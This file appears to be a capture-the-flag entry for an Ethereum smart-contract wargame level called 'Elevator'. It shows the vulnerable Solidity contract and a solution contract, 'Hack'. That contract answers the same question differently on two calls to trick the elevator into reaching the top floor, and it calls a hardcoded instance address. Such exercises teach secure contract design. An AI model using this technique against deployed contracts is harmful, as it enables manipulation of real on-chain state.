@@ -1,0 +1,59 @@
+Elevator
+Difficulty 4/10
+
+This elevator won't let you reach the top of your building. Right?
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+Solution 
+
+Script
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+interface Victim {
+  function goTo(uint _floor) external;
+}
+
+contract Hack { 
+
+
+    bool bandera = true;
+    constructor() {
+    }
+
+    function atack() external{
+        Victim victim = Victim(0x83A7238F241E19Df87882e0A48ec3D10e8949102);
+        victim.goTo(3);
+    }
+
+    function isLastFloor(uint) external returns (bool) {
+        if(bandera){
+            bandera = false;
+            return false;
+        }
+        return true;
+    }
+}
+
